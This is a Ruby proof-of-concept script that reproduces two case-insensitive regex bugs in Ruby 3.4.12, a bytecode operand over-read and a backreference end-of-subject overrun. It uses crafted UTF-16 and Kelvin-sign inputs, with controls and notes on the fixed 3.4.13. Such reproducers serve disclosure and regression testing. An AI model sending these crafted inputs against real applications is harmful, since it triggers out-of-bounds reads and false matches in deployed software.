#!/usr/bin/env ruby
# Adjacent lanes from the 2026-11-18 Ruby fix series, case-insensitive matching.
# Neither is the admitted primary bug (CVE-2026-132825): both need an
# application that compiles attacker-controlled patterns or matches crafted
# strings against them, so neither is a stock-Rails/stock-Sinatra path.
#
# Usage: ruby ruby2shell-adjacent-ic.rb wpqw|pvgc
#
# wpqw (GHSA-wpqw-5qxg-m68r, upstream e3591b3d5d): OP_EXACT1_IC/OP_EXACTN_IC
#   advanced the bytecode pointer by the case-fold length without checking the
#   operand. A multi-character UTF-16 fold (U+1E98 -> "w" + U+030A) makes the
#   matcher read past the operand and can report a false match. Vulnerable
#   3.4.12 ASan: global-buffer-overflow READ in match_at regexec.c:2747, rc=1;
#   3.4.13: clean and correct rc=0.
# pvgc (GHSA-pvgc-g7gj-pv6h, upstream 9a6ccf70d5): string_cmp_ic folded the
#   character at the end of the subject in a case-insensitive backreference
#   comparison and could report a match ending beyond the subject. Vulnerable
#   3.4.12: (k\0)\1 matches "k\0\u212a" (false positive); 3.4.13: no match.
#   ASan stays silent in this shape; no rung-3 claim for pvgc.
$stdout.sync = true
case ARGV.fetch(0)
when "wpqw"
  enc = Encoding::UTF_16LE
  tail = "\u0103\u3042\u3044"
  # Controls first: correct folds must still match.
  re = Regexp.new(("x" * 16 + "(?i:w)" + tail).encode(enc))
  puts "ctrl-match=#{re.match?(("x" * 16 + "W" + tail).encode(enc))}"
  # Crafted non-matching subject: U+1E98 folds to two characters.
  bad = ("x" * 16 + "\u1E98" + "y" * 8).encode(enc)
  puts "crafted-nomatch=#{re.match?(bad)}"
  re2 = Regexp.new("(?-i:xyz)t(?-i:\u0103)".encode(enc), Regexp::IGNORECASE)
  puts "ctrl2-match=#{re2.match?("xyzT\u0103".encode(enc))}"
  puts "crafted2-nomatch=#{re2.match?("xyz\u1E97".encode(enc))}"
  # Short pattern; this correct match faults on the affected build under ASan
  # because the fold length overruns the operand. Deliberately last.
  re3 = Regexp.new("(?i:w)\u6203AB".encode(enc))
  puts "short-match=#{re3.match?("W\u6203AB".encode(enc))}"
  puts "short-nomatch=#{re3.match?("\u1E98\u6203AB".encode(enc))}"
when "pvgc"
  puts "oob-nomatch=#{/(k\0)\1/i.match?("k\0\u212a")}"
  puts "normal-match=#{/(k)\1/i.match?("k\u212a")}"
  puts "ctrl-match=#{/(k\0)\1/i.match?("k\0\u212a\0")}"
else
  abort "usage: #{$PROGRAM_NAME} wpqw|pvgc"
end
